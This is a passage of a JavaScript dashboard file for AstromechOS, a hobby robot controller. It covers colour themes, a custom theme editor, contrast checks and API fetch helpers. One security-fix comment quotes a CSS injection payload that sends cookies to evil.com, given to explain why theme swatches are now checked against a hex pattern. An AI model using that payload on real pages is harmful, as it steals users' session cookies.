/*
 * ============================================================
 *   █████╗  ██████╗ ███████╗
 *  ██╔══██╗██╔═══██╗██╔════╝
 *  ███████║██║   ██║███████╗
 *  ██╔══██║██║   ██║╚════██║
 *  ██║  ██║╚██████╔╝███████║
 *  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
 *
 *  AstromechOS — Distributed Robot Controller
 * ============================================================
 *  Copyright (C) 2026 RickDnamps
 *  https://github.com/RickDnamps/AstromechOS
 *
 *  This file is part of AstromechOS.
 *
 *  AstromechOS is free software: you can redistribute it
 *  and/or modify it under the terms of the GNU General
 *  Public License as published by the Free Software
 *  Foundation, either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  AstromechOS is distributed in the hope that it will be
 *  useful, but WITHOUT ANY WARRANTY; without even the implied
 *  warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR
 *  PURPOSE. See the GNU General Public License for details.
 *
 *  You should have received a copy of the GNU GPL along with
 *  AstromechOS. If not, see <https://www.gnu.org/licenses/>.
 * ============================================================
 */
/**
 * AstromechOS Dashboard — app.js
 * Holographic theme — Classes + REST polling
 * No external dependencies.
 */

'use strict';

// ================================================================
// Themes
// ================================================================

const _THEMES = {
  default: {
    label: 'Default', swatch: '#00aaff',
    vars: {},  // :root defaults apply — nothing to override
  },
  r2d2: {
    label: 'R2-D2', swatch: '#0849d6',
    vars: {
      '--bg': '#05080e', '--bg2': '#080c18', '--bg3': '#0c1226',
      '--bg-card': 'rgba(5,8,14,0.94)',
      '--blue': '#0849d6', '--blue-rgb': '8, 73, 214',
      '--cyan': '#c1c3c9', '--cyan-rgb': '193, 195, 201', '--teal': '#c1c3c9',
      '--green': '#00cc66', '--orange': '#ff8800', '--red': '#ff2244',
      '--glow': '0 0 16px rgba(8,73,214,0.50)',
      '--glow-cyan': '0 0 12px rgba(193,195,201,0.25)',
      '--text': '#eef4ff', '--text-dim': '#4466aa',
      '--scan-color': '#c1c3c9',
    },
  },
  r2d2_light: {
    label: 'R2-D2 Clair', swatch: '#0849d6', light: true,
    vars: {
      // ── Blueprint: pale blue-sky bg, navy topbar, light-blue cards ──
      '--bg': '#dde8f8', '--bg2': '#d0def5', '--bg3': '#c8d8f0',
      '--bg-card': 'rgba(238,244,255,0.95)',
      '--bg-hover': 'rgba(8,73,214,0.08)',
      '--blue': '#0849d6', '--blue-rgb': '8, 73, 214',
      '--cyan': '#0066cc', '--cyan-rgb': '0, 102, 204', '--teal': '#0066cc',
      '--green': '#006633', '--orange': '#cc5500', '--red': '#cc1133',
      '--gray': '#5566aa', '--amber': '#b56000',
      '--text': '#0a1840', '--text-dim': '#4a6090',
      '--border': 'rgba(8,73,214,0.20)', '--border2': 'rgba(8,73,214,0.15)',
      '--border-hi': 'rgba(8,73,214,0.45)',
      '--glow': '0 0 12px rgba(8,73,214,0.18)',
      '--glow-cyan': '0 0 10px rgba(0,102,204,0.15)',
      '--glow-red': '0 0 14px rgba(204,17,51,0.4)',
      '--grid-line': 'rgba(8,73,214,0.04)', '--scan-color': '#0849d6',
      // ── Structural backgrounds ──
      '--topbar-bg':       '#0a1840',
      '--sidebar-bg':      'rgba(8,73,214,0.06)',
      '--input-bg':        'rgba(213,226,244,0.9)',
      '--input-option':    '#c8d8f0',
      '--bg-dark-overlay': 'rgba(8,73,214,0.08)',
      '--card-dark':       'rgba(238,244,255,0.9)',
      '--pill-bg':         'rgba(238,244,255,0.9)',
      '--btn-bg':          'rgba(8,73,214,0.08)',
      '--btn-hover-bg':    'rgba(8,73,214,0.18)',
      '--modal-overlay':   'rgba(10,24,64,0.65)',
      '--modal-bg':        'rgba(238,244,255,0.97)',
      // ── Surface overlays (blue tint on light bg) ──
      '--surface-dim':    'rgba(8,73,214,0.04)',
      '--surface':        'rgba(8,73,214,0.05)',
      '--surface-subtle': 'rgba(8,73,214,0.06)',
      '--surface2':       'rgba(8,73,214,0.08)',
      '--surface3':       'rgba(8,73,214,0.10)',
      '--surface4':       'rgba(8,73,214,0.12)',
      '--surface5':       'rgba(8,73,214,0.15)',
      // ── Status colors (readable on light bg) ──
      '--status-ok':   '#007744',
      '--status-warn': '#aa5500',
      '--status-err':  '#cc1133',
      '--val-color':   '#0849d6',
    },
  },
  r5d4: {
    label: 'R5-D4', swatch: '#ff3333',
    vars: {
      '--bg': '#120608', '--bg2': '#180a0c', '--bg3': '#1e0c10',
      '--bg-card': 'rgba(18,6,8,0.92)',
      '--blue': '#ff3333', '--blue-rgb': '255, 51, 51',
      '--cyan': '#ff8844', '--cyan-rgb': '255, 136, 68', '--teal': '#ff8844',
      '--green': '#cc6633', '--orange': '#ff6600', '--red': '#ff1122',
      '--glow': '0 0 14px rgba(255,51,51,0.35)',
      '--glow-cyan': '0 0 14px rgba(255,136,68,0.3)',
      '--text': '#eacaca', '--text-dim': '#8a4a4a',
      '--scan-color': '#ff8844',
    },
  },
  bb8: {
    label: 'BB-8', swatch: '#ff8800',
    vars: {
      '--bg': '#120c04', '--bg2': '#181006', '--bg3': '#1e1408',
      '--bg-card': 'rgba(18,12,4,0.92)',
      '--blue': '#ff8800', '--blue-rgb': '255, 136, 0',
      '--cyan': '#ffcc00', '--cyan-rgb': '255, 204, 0', '--teal': '#ffcc00',
      '--green': '#cc8800', '--orange': '#ff6600', '--red': '#ff3300',
      '--glow': '0 0 14px rgba(255,136,0,0.35)',
      '--glow-cyan': '0 0 14px rgba(255,204,0,0.3)',
      '--text': '#ead8c0', '--text-dim': '#8a6840',
      '--scan-color': '#ffcc00',
    },
  },
  chopper: {
    label: 'Chopper', swatch: '#ddbb00',
    vars: {
      '--bg': '#0a0c08', '--bg2': '#0e1008', '--bg3': '#12140a',
      '--bg-card': 'rgba(10,12,8,0.92)',
      '--blue': '#ddbb00', '--blue-rgb': '221, 187, 0',
      '--cyan': '#4499ff', '--cyan-rgb': '68, 153, 255', '--teal': '#4499ff',
      '--green': '#88aa00', '--orange': '#dd8800', '--red': '#dd3300',
      '--glow': '0 0 14px rgba(221,187,0,0.35)',
      '--glow-cyan': '0 0 14px rgba(68,153,255,0.3)',
      '--text': '#dddab0', '--text-dim': '#7a7840',
      '--scan-color': '#4499ff',
    },
  },
  r2q5: {
    label: 'R2-Q5', swatch: '#8899aa',
    vars: {
      '--bg': '#070709', '--bg2': '#09090d', '--bg3': '#0b0b11',
      '--bg-card': 'rgba(7,7,9,0.95)',
      '--blue': '#8899aa', '--blue-rgb': '136, 153, 170',
      '--cyan': '#cc1122', '--cyan-rgb': '204, 17, 34', '--teal': '#cc1122',
      '--green': '#557766', '--orange': '#886644', '--red': '#cc1122',
      '--glow': '0 0 14px rgba(136,153,170,0.35)',
      '--glow-cyan': '0 0 14px rgba(204,17,34,0.3)',
      '--text': '#b0bcc8', '--text-dim': '#445566',
      '--scan-color': '#cc1122',
    },
  },
};

let _activeTheme = 'default';

// ----------------------------------------------------------------
// Theme application
// ----------------------------------------------------------------
function applyTheme(id, persist = true) {
  let vars = null;
  if (_THEMES[id]) {
    vars = _THEMES[id].vars;
  } else {
    const custom = _loadCustomThemes().find(c => c.id === id);
    if (custom) vars = custom.vars;
  }
  // B5/E1 fix 2026-05-16: fallback to default if vars missing (custom
  // theme deleted by another tab while this one had it active). Was
  // silent early-return → root kept the previous theme's inline styles
  // → operator stuck on a 'ghost' theme until manual reload.
  if (!vars && id !== 'default') {
    id = 'default';
    vars = {};
  }
  const root = document.documentElement;
  root.removeAttribute('style');
  if (id !== 'default' && vars) {
    Object.entries(vars).forEach(([k, v]) => root.style.setProperty(k, v));
  }
  // WOW polish X4 2026-05-15: persist=false for ephemeral hover preview.
  // Only commit to localStorage + flip active state when the change is
  // a real selection (click), not a hover preview.
  if (persist) {
    _activeTheme = id;
    localStorage.setItem('astromech-theme', id);
    document.querySelectorAll('.theme-btn').forEach(b =>
      b.classList.toggle('active', b.dataset.theme === id)
    );
  }
}

// ----------------------------------------------------------------
// Theme customizer
// ----------------------------------------------------------------
const _CUSTOM_THEMES_KEY = 'astromech-custom-themes';

function _loadCustomThemes() {
  try { return JSON.parse(localStorage.getItem(_CUSTOM_THEMES_KEY) || '[]'); }
  catch (e) { return []; }
}

function _saveCustomThemesStore(list) {
  localStorage.setItem(_CUSTOM_THEMES_KEY, JSON.stringify(list));
}

function _hexToRgbStr(hex) {
  return [
    parseInt(hex.slice(1,3),16),
    parseInt(hex.slice(3,5),16),
    parseInt(hex.slice(5,7),16)
  ].join(', ');
}

function _shadeHex(hex, amt) {
  const clamp = v => Math.min(255, Math.max(0, v));
  const r = clamp(parseInt(hex.slice(1,3),16) + amt);
  const g = clamp(parseInt(hex.slice(3,5),16) + amt);
  const b = clamp(parseInt(hex.slice(5,7),16) + amt);
  return '#' + [r,g,b].map(v => v.toString(16).padStart(2,'0')).join('');
}

function _buildCustomVars() {
  const bg      = document.getElementById('theme-editor-bg').value;
  const topbar  = document.getElementById('theme-editor-topbar').value;
  const card    = document.getElementById('theme-editor-card').value;
  const accent  = document.getElementById('theme-editor-accent').value;
  const textVal = document.getElementById('theme-editor-text').value;
  const stOk    = document.getElementById('theme-editor-ok').value;
  const stWarn  = document.getElementById('theme-editor-warn').value;
  const stErr   = document.getElementById('theme-editor-err').value;
  const fontOpt = (document.querySelector('input[name="theme-font"]:checked') || {}).value || 'system';
  const bg2 = _shadeHex(bg, 6);
  const bg3 = _shadeHex(bg, 12);
  const accent2 = _shadeHex(accent, 40);
  const _fontMap = {
    orbitron:    ["'Orbitron', 'Courier New', monospace",        "'Share Tech Mono', 'Courier New', monospace"],
    sharetech:   ["'Share Tech Mono', 'Courier New', monospace", "'Share Tech Mono', 'Courier New', monospace"],
    audiowide:   ["'Audiowide', 'Courier New', monospace",       "'Share Tech Mono', 'Courier New', monospace"],
    electrolize: ["'Electrolize', 'Courier New', monospace",     "'Electrolize', 'Courier New', monospace"],
    exo2:        ["'Exo 2', 'Courier New', monospace",           "'Share Tech Mono', 'Courier New', monospace"],
    rajdhani:    ["'Rajdhani', 'Courier New', monospace",        "'Share Tech Mono', 'Courier New', monospace"],
    system:      ["'Courier New', Courier, monospace",           "'Courier New', Courier, monospace"],
  };
  const [fontUI, fontData] = _fontMap[fontOpt] || _fontMap.system;
  const bgRgb      = _hexToRgbStr(bg);
  const accentRgb  = _hexToRgbStr(accent);
  const accent2Rgb = _hexToRgbStr(accent2);
  const cardRgb    = _hexToRgbStr(card);
  return {
    '--bg': bg, '--bg2': bg2, '--bg3': bg3,
    '--bg-card': card,
    '--blue': accent, '--blue-rgb': accentRgb,
    '--cyan': accent2, '--cyan-rgb': accent2Rgb, '--teal': accent2,
    '--text': textVal, '--text-dim': `rgba(${_hexToRgbStr(textVal)},0.5)`,
    '--topbar-bg': topbar,
    '--sidebar-bg': `rgba(${bgRgb},0.5)`,
    '--input-bg': `rgba(${bgRgb},0.8)`,
    '--input-option': bg2,
    '--bg-dark-overlay': 'rgba(0,0,0,0.4)',
    '--card-dark': card,
    '--pill-bg': `rgba(${cardRgb},0.9)`,
    '--btn-bg': `rgba(${accentRgb},0.12)`,
    '--btn-hover-bg': `rgba(${accentRgb},0.25)`,
    '--modal-overlay': 'rgba(0,0,0,0.6)',
    '--modal-bg': `rgba(${bgRgb},0.95)`,
    '--surface-dim': `rgba(${accentRgb},0.04)`,
    '--surface': `rgba(${accentRgb},0.06)`,
    '--surface-subtle': `rgba(${accentRgb},0.07)`,
    '--surface2': `rgba(${accentRgb},0.09)`,
    '--surface3': `rgba(${accentRgb},0.12)`,
    '--surface4': `rgba(${accentRgb},0.15)`,
    '--surface5': `rgba(${accentRgb},0.20)`,
    '--glow': `0 0 14px rgba(${accentRgb},0.35)`,
    '--glow-cyan': `0 0 14px rgba(${accent2Rgb},0.3)`,
    '--scan-color': accent,
    '--status-ok': stOk, '--status-warn': stWarn, '--status-err': stErr,
    '--val-color': accent,
    '--font': fontUI, '--font-data': fontData,
  };
}

function _fitPreview() {
  const clip = document.querySelector('.theme-preview-clip');
  const mini = document.querySelector('.theme-preview-mini');
  if (!clip || !mini) return;
  const W = 900, H = 850;
  const scale = clip.offsetWidth / W;
  mini.style.transform = `scale(${scale})`;
  clip.style.height = Math.ceil(H * scale) + 'px';
}

// P1/P2 fix 2026-05-16: rAF-batch the preview. Color picker oninput
// fires 60+ times/sec on drag → was rebuilding 40 CSS vars + reading
// clip.offsetWidth (forced reflow) per pixel → visible jank on tablet.
let _previewRaf = 0;
function previewCustomTheme() {
  if (_previewRaf) return;
  _previewRaf = requestAnimationFrame(() => {
    _previewRaf = 0;
    _doPreviewCustomTheme();
  });
}

function _doPreviewCustomTheme() {
  const vars = _buildCustomVars();
  const root = document.documentElement;
  // P1 fix 2026-05-16: don't removeAttribute('style') — setProperty
  // overwrites the var and avoids the extra full-style-invalidation
  // from the attribute wipe.
  Object.entries(vars).forEach(([k, v]) => root.style.setProperty(k, v));
  ['bg','topbar','card','accent','text','ok','warn','err'].forEach(f => {
    const lbl = document.getElementById('lbl-' + f);
    const inp = document.getElementById('theme-editor-' + f);
    if (lbl && inp) lbl.textContent = inp.value;
  });
  // W5 fix 2026-05-16: update WCAG contrast indicators
  _updateContrastIndicators();
}

function openThemeEditor(id) {
  const editor = document.getElementById('theme-editor');
  if (!editor) return;
  editor.style.display = 'block';
  editor.dataset.editId = id || '';
  document.getElementById('theme-editor-title').textContent = id ? 'EDIT THEME' : 'NEW THEME';
  setTimeout(_fitPreview, 0);
  const defaults = {
    bg: '#080c14', topbar: '#050810', card: '#0d1525',
    accent: '#00aaff', text: '#c8d8ea',
    ok: '#00ff88', warn: '#ffcc00', err: '#ff4455',
  };
  if (id) {
    const t = _loadCustomThemes().find(c => c.id === id);
    if (t) {
      document.getElementById('theme-editor-name').value = t.label || '';
      Object.keys(defaults).forEach(f => {
        const el = document.getElementById('theme-editor-' + f);
        if (el) el.value = t['_picker' + f.charAt(0).toUpperCase() + f.slice(1)] || defaults[f];
      });
      const r = document.querySelector(`input[name="theme-font"][value="${t._pickerFont||'system'}"]`);
      if (r) r.checked = true;
    }
  } else {
    document.getElementById('theme-editor-name').value = '';
    Object.keys(defaults).forEach(f => {
      const el = document.getElementById('theme-editor-' + f);
      if (el) el.value = defaults[f];
    });
    const r = document.querySelector('input[name="theme-font"][value="system"]');
    if (r) r.checked = true;
  }
  previewCustomTheme();
}

function closeThemeEditor() {
  const editor = document.getElementById('theme-editor');
  if (editor) editor.style.display = 'none';
  applyTheme(_activeTheme);
}

function saveCustomTheme() {
  const name = document.getElementById('theme-editor-name').value.trim();
  if (!name) { alert('Please enter a theme name'); return; }
  const editId  = document.getElementById('theme-editor').dataset.editId;
  const fontOpt = (document.querySelector('input[name="theme-font"]:checked') || {}).value || 'system';
  const entry = {
    id: editId || ('custom_' + Date.now()),
    label: name,
    swatch: document.getElementById('theme-editor-accent').value,
    vars: _buildCustomVars(),
    _pickerBg:     document.getElementById('theme-editor-bg').value,
    _pickerTopbar: document.getElementById('theme-editor-topbar').value,
    _pickerCard:   document.getElementById('theme-editor-card').value,
    _pickerAccent: document.getElementById('theme-editor-accent').value,
    _pickerText:   document.getElementById('theme-editor-text').value,
    _pickerOk:     document.getElementById('theme-editor-ok').value,
    _pickerWarn:   document.getElementById('theme-editor-warn').value,
    _pickerErr:    document.getElementById('theme-editor-err').value,
    _pickerFont:   fontOpt,
  };
  const list = _loadCustomThemes().filter(c => c.id !== entry.id);
  // Audit finding A2-L4 2026-05-15: cap custom themes at 16 so a
  // browser tab kept open for months can't grow localStorage to
  // its 5-10MB limit. Self-DoS only (per-tab), but worth a guard.
  const _CUSTOM_THEMES_MAX = 16;
  if (list.length >= _CUSTOM_THEMES_MAX) {
    toast(`Custom themes capped at ${_CUSTOM_THEMES_MAX} — delete some first`, 'warn');
    return;
  }
  list.push(entry);
  _saveCustomThemesStore(list);
  document.getElementById('theme-editor').style.display = 'none';
  _renderThemePicker();
  applyTheme(entry.id);
}

function deleteCustomTheme(id) {
  _saveCustomThemesStore(_loadCustomThemes().filter(c => c.id !== id));
  _renderThemePicker();
  if (_activeTheme === id) applyTheme('default');
}

// WOW polish X4 2026-05-15: theme hover preview. Hover a theme card →
// the whole UI re-skins ephemerally; mouseleave restores. Click still
// commits via applyTheme. Prevents risky "click to apply" surprises.
let _themePreviewActive = null;
function _previewThemeEphemeral(id) {
  if (_themePreviewActive) return;   // already previewing
  _themePreviewActive = _activeTheme;
  applyTheme(id, /*persist=*/false);
}
function _restoreActiveTheme() {
  if (!_themePreviewActive) return;
  const restoreId = _themePreviewActive;
  _themePreviewActive = null;
  applyTheme(restoreId, /*persist=*/false);
}

function _renderThemePicker() {
  const grid = document.getElementById('theme-grid');
  if (!grid) return;
  grid.innerHTML = '';
  Object.entries(_THEMES).forEach(([id, theme]) => {
    const btn = document.createElement('button');
    btn.className = 'theme-btn' + (id === _activeTheme ? ' active' : '');
    btn.dataset.theme = id;
    btn.onmouseenter = () => _previewThemeEphemeral(id);
    btn.onmouseleave = () => _restoreActiveTheme();
    btn.onclick = () => { _themePreviewActive = null; applyTheme(id); };
    // B-44 (audit 2026-05-15): theme labels for built-ins are
    // constants — but the same render code path is used for custom
    // themes (line below) where the label comes from operator input
    // stored in localStorage. Build via DOM so a malicious or
    // accidentally-pasted HTML-shaped label can't escape.
    const sw = document.createElement('span');
    sw.className = 'theme-swatch';
    sw.style.cssText = theme.light
      ? `background:linear-gradient(135deg,#ffffff 50%,${theme.swatch} 50%);border-color:${theme.swatch}`
      : `background:${theme.swatch}`;
    btn.append(sw, document.createTextNode(theme.label || ''));
    grid.appendChild(btn);
  });
  _loadCustomThemes().forEach(t => {
    const wrap = document.createElement('div');
    wrap.className = 'theme-btn-custom';
    const btn = document.createElement('button');
    btn.className = 'theme-btn' + (t.id === _activeTheme ? ' active' : '');
    btn.dataset.theme = t.id;
    // WOW polish X4: hover preview for custom themes too.
    btn.onmouseenter = () => _previewThemeEphemeral(t.id);
    btn.onmouseleave = () => _restoreActiveTheme();
    btn.onclick = () => { _themePreviewActive = null; applyTheme(t.id); };
    // B-44 mirror — custom theme labels are the real XSS sink. DOM
    // build with textContent for the label.
    const csw = document.createElement('span');
    csw.className = 'theme-swatch';
    // B2 fix 2026-05-16: was .style.cssText with raw t.swatch — CSS
    // injection if localStorage is tampered (devtools / XSS-elsewhere)
    // to put e.g. 'red;background-image:url(//evil.com/log?'+cookie+')'.
    // Now validate hex format before injection + use setProperty path.
    csw.style.background = /^#[0-9a-fA-F]{6}$/.test(t.swatch || '') ? t.swatch : '#888888';
    btn.append(csw, document.createTextNode(t.label || ''));
    const editBtn = document.createElement('button');
    editBtn.className = 'theme-btn-edit';
    editBtn.title = 'Edit';
    // B11 fix 2026-05-16: textContent per CLAUDE.md post-feature audit
    // ('createElement + textContent — jamais innerHTML avec interpolation').
    editBtn.textContent = '✏';
    editBtn.onclick = e => { e.stopPropagation(); openThemeEditor(t.id); };
    const delBtn = document.createElement('button');
    delBtn.className = 'theme-btn-del';
    delBtn.title = 'Delete';
    delBtn.textContent = '✕';
    delBtn.onclick = e => { e.stopPropagation(); deleteCustomTheme(t.id); };
    wrap.appendChild(btn);
    wrap.appendChild(editBtn);
    wrap.appendChild(delBtn);
    grid.appendChild(wrap);
  });
}

// W5 fix 2026-05-16: WCAG-AA contrast ratio between text/bg & accent/bg.
// Safety net against picking unreadable color pairs (e.g. dark text on
// dark bg → invisible at convention demo in bright sunlight).
function _hexToRgb(hex) {
  if (!/^#[0-9a-fA-F]{6}$/.test(hex || '')) return [0, 0, 0];
  return [parseInt(hex.slice(1,3),16), parseInt(hex.slice(3,5),16), parseInt(hex.slice(5,7),16)];
}
function _relLum(rgb) {
  const [r,g,b] = rgb.map(c => {
    const cs = c / 255;
    return cs <= 0.03928 ? cs/12.92 : Math.pow((cs+0.055)/1.055, 2.4);
  });
  return 0.2126*r + 0.7152*g + 0.0722*b;
}
function _contrastRatio(hex1, hex2) {
  const l1 = _relLum(_hexToRgb(hex1));
  const l2 = _relLum(_hexToRgb(hex2));
  const [hi, lo] = l1 > l2 ? [l1, l2] : [l2, l1];
  return (hi + 0.05) / (lo + 0.05);
}
function _updateContrastIndicators() {
  const target = el('theme-contrast-indicators');
  if (!target) return;
  const bg     = el('theme-editor-bg')?.value     || '#000000';
  const text   = el('theme-editor-text')?.value   || '#ffffff';
  const accent = el('theme-editor-accent')?.value || '#00aaff';
  const fmt = (ratio) => {
    const tier = ratio >= 7 ? 'AAA' : ratio >= 4.5 ? 'AA' : 'FAIL';
    const cls  = ratio >= 4.5 ? 'pass' : 'fail';
    return `<span class="contrast-pill contrast-${cls}">${ratio.toFixed(1)}:1 ${tier === 'FAIL' ? '✗' : '✓'} ${tier}</span>`;
  };
  target.innerHTML =
    `<div><span class="contrast-label">Text on BG:</span> ${fmt(_contrastRatio(text, bg))}</div>` +
    `<div><span class="contrast-label">Accent on BG:</span> ${fmt(_contrastRatio(accent, bg))}</div>`;
}

function _initThemes() {
  _renderThemePicker();
  window.addEventListener('resize', _fitPreview);
  // E2 fix 2026-05-16: cross-tab sync. When tab A deletes a custom
  // theme that tab B has applied, tab B's theme grid + applied theme
  // are stale until manual reload.
  window.addEventListener('storage', e => {
    if (e.key === _CUSTOM_THEMES_KEY || e.key === 'astromech-theme') {
      _renderThemePicker();
      const active = localStorage.getItem('astromech-theme') || 'default';
      applyTheme(active, false);  // false = don't re-persist, just apply
      _activeTheme = active;
    }
  });
  // E11 fix 2026-05-16: visibilitychange clears stale hover preview
  // (mouse left page entirely so no mouseleave fired).
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) _restoreActiveTheme();
  });
}

// Apply saved theme immediately when script loads — before first paint
;(function () {
  const saved = localStorage.getItem('astromech-theme');
  let id = 'default';
  if (saved) {
    if (_THEMES[saved]) {
      id = saved;
    } else {
      const customs = _loadCustomThemes();
      if (customs.find(c => c.id === saved)) id = saved;
    }
  }
  _activeTheme = id;
  if (id === 'default') return;
  const root = document.documentElement;
  const builtIn = _THEMES[id];
  if (builtIn) {
    Object.entries(builtIn.vars).forEach(([k, v]) => root.style.setProperty(k, v));
  } else {
    const custom = _loadCustomThemes().find(c => c.id === id);
    if (custom) Object.entries(custom.vars).forEach(([k, v]) => root.style.setProperty(k, v));
  }
}());

// ================================================================
// Utilities
// ================================================================

function el(id) { return document.getElementById(id); }

// Sync .holo-slider gradient fill (--val) to the slider's current value.
// Must be called after any programmatic value assignment AND on input events.
function syncHoloSlider(s) {
  if (!s) return;
  const pct = ((s.value - s.min) / (s.max - s.min) * 100).toFixed(1);
  s.style.setProperty('--val', pct + '%');
}

function escapeHtml(s) {
  // Audit finding A2-L2 2026-05-15: now also escapes ' (single quote)
  // and ` (backtick). Previously missing — meant the function was
  // unsafe inside HTML attribute values delimited by either char.
  // The codebase has migrated nearly every sink to createElement +
  // textContent, but completing the escape map closes the gap for
  // any remaining or future caller.
  return String(s)
    .replace(/&/g,'&amp;')
    .replace(/</g,'&lt;')
    .replace(/>/g,'&gt;')
    .replace(/"/g,'&quot;')
    .replace(/'/g,'&#39;')
    .replace(/`/g,'&#96;');
}

// ================================================================
// API Helper
// ================================================================

// S11 fix 2026-05-16: per-robot localStorage namespacing helpers.
// Multiple AstromechOS instances managed from the same browser
// would otherwise share last-played markers (operator switches
// from R2 to BB-8, sees R2's green dot on the wrong card).
// _robotKey returns a namespaced key once the StatusPoller has
// cached the robot name; before that, returns the legacy key
// for backwards-compat reads.
let _cachedRobotName = '';
function _setCachedRobotName(name) {
  _cachedRobotName = (name || '').trim();
}
function _lsKey(baseKey) {
  if (!_cachedRobotName) return baseKey;   // fallback to legacy
  return baseKey + ':' + _cachedRobotName;
}
// Read with fallback to legacy key for migration.
function _lsGet(baseKey) {
  try {
    const namespaced = localStorage.getItem(_lsKey(baseKey));
    if (namespaced !== null) return namespaced;
    return localStorage.getItem(baseKey);   // legacy fallback
  } catch { return null; }
}
function _lsSet(baseKey, value) {
  try { localStorage.setItem(_lsKey(baseKey), value); } catch {}
}

// WOW polish 2026-05-15: universal save-button feedback helper.
// Wrap any async save: disables the button, shows Saving…, then
// Saved ✓ pulse, then restores. Failure path shows Failed in red,
// restores after slightly longer. Operator gets immediate proof of
// what happened — no more silent "did it work?" anxiety.
//
// Usage:
//   await withSaveFeedback(el('btn-id'), async () => {
//     const r = await api('/foo', 'POST', body);
//     if (!r) throw new Error('failed');
//     return r;
//   });
async function withSaveFeedback(btn, asyncFn, opts = {}) {
  if (!btn) return asyncFn();
  const origText  = btn.textContent;
  const wasDisabled = btn.disabled;
  const savingTxt = opts.saving || 'Saving…';
  const savedTxt  = opts.saved  || 'Saved ✓';
  const failedTxt = opts.failed || 'Failed';
  btn.disabled = true;
  btn.classList.add('btn-saving');
  btn.textContent = savingTxt;
  try {
    const result = await asyncFn();
    btn.classList.remove('btn-saving');
    btn.classList.add('btn-saved');
    btn.textContent = savedTxt;
    setTimeout(() => {
      btn.classList.remove('btn-saved');
      btn.textContent = origText;
      btn.disabled = wasDisabled;
    }, 1400);
    return result;
  } catch (e) {
    btn.classList.remove('btn-saving');
    btn.classList.add('btn-failed');
    btn.textContent = failedTxt;
    setTimeout(() => {
      btn.classList.remove('btn-failed');
      btn.textContent = origText;
      btn.disabled = wasDisabled;
    }, 1800);
    throw e;
  }
}

async function api(endpoint, method = 'GET', body = null, timeoutMs = 3000) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
    const url  = base + endpoint;
    const headers = { 'Content-Type': 'application/json' };
    // Sequences-tab audit B-1 (2026-05-15): admin endpoints require
    // an X-Admin-Pw header. AdminGuard remembers the password in memory
    // after a successful /settings/admin/verify and exposes it via
    // .getToken(); we attach it transparently on EVERY request so
    // admin operations and admin-protected reads (/diagnostics/logs,
    // /diagnostics/uart_rtt — all GET methods) work without each call
    // site needing to know. Non-admin endpoints ignore the header.
    // Updated 2026-05-15 (Settings MEDIUM post-deploy fix): was only
    // attaching on non-GET, which broke the diagnostics panel after
    // B-64/B-66 made those reads admin-only.
    if (typeof adminGuard !== 'undefined') {
      const tok = adminGuard.getToken && adminGuard.getToken();
      if (tok) headers['X-Admin-Pw'] = tok;
    }
    const opts = { method, headers, signal: ctrl.signal };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(url, opts);
    if (!res.ok) { console.warn(`API ${method} ${endpoint}: HTTP ${res.status}`); return null; }
    const data = await res.json();
    return data;
  } catch (e) {
    if (e.name !== 'AbortError') console.error(`API ${method} ${endpoint}:`, e);
    return null;
  } finally {
    clearTimeout(timer);
  }
}

// apiDetail — same wire pattern as api() but returns the full response
// shape: {ok, status, data, error}. Use when the caller needs to
// distinguish 401 (admin lock expired) from 409 (conflict) from 503
// (busy) from 5xx (server bug) — choreo editor save/rename/play_failed
// flows in particular. Audit finding (multiple) 2026-05-15: api()
// collapses every non-2xx into `null`, which forced callers to fall
// back to generic toasts.
async function apiDetail(endpoint, method = 'GET', body = null, timeoutMs = 5000) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
    const url  = base + endpoint;
    const headers = { 'Content-Type': 'application/json' };
    if (typeof adminGuard !== 'undefined') {
      const tok = adminGuard.getToken && adminGuard.getToken();
      if (tok) headers['X-Admin-Pw'] = tok;
    }
    const opts = { method, headers, signal: ctrl.signal };
    if (body) opts.body = JSON.stringify(body);
    const res = await fetch(url, opts);
    let data = null;
    try { data = await res.json(); } catch {}
    if (!res.ok) {
      // Audit finding Perf L-9 2026-05-15: 413 Request Entity Too
      // Large (server's MAX_CONTENT_LENGTH=16MB cap) used to surface
      // as a generic error. Make the message specific so the
      // operator knows the upload was rejected for size.
      let err;
      if (res.status === 413) {
        err = 'Request too large (max 16MB). Reduce file size and retry.';
      } else {
        err = (data && data.error) || `HTTP ${res.status}`;
      }
      console.warn(`API ${method} ${endpoint}: ${res.status} ${err}`);
      return { ok: false, status: res.status, data, error: err };
    }
    return { ok: true, status: res.status, data, error: null };
  } catch (e) {
    const err = e.name === 'AbortError' ? 'timeout' : (e.message || String(e));
    if (e.name !== 'AbortError') console.error(`API ${method} ${endpoint}:`, e);
    return { ok: false, status: 0, data: null, error: err };
  } finally {
    clearTimeout(timer);
  }
}

// F-6: single-in-flight slot for /motion/arcade and /motion/drive POSTs.
// The joystick onMove fires at 60Hz; on a slow network these can stack up
// in the browser's HTTP/1.1 queue and arrive out of order on the Pi. Worse,
// a `driveStop` POST issued on release can land BEFORE the last few stale
// arcade commands — the robot keeps moving after the joystick is released.
//
// This helper aborts the previous in-flight motion request as soon as a
// new one starts. driveStop / domeStop use regular api() (NOT this helper)
// so the release POST is never aborted and always reaches the server.
// Audit finding Joystick M-2 2026-05-15: per-AXIS abort slots so a
// dome/turn POST doesn't cancel an in-flight arcade POST (and vice
// versa). With one global slot, two-thumb operation made the robot
// pulse propulsion every time the operator nudged the dome thumb.
// Maps endpoint prefix → its own AbortController slot.
const _motionAborts = { drive: null, dome: null };
function _motionSlotFor(endpoint) {
  return endpoint.startsWith('/motion/dome') ? 'dome' : 'drive';
}
async function _postMotion(endpoint, body, timeoutMs = 3000) {
  const slot = _motionSlotFor(endpoint);
  if (_motionAborts[slot]) { try { _motionAborts[slot].abort(); } catch {} }
  const ctrl = new AbortController();
  _motionAborts[slot] = ctrl;
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try {
    const base = (typeof window.R2D2_API_BASE === 'string' && window.R2D2_API_BASE) ? window.R2D2_API_BASE : '';
    const url  = base + endpoint;
    const res  = await fetch(url, {
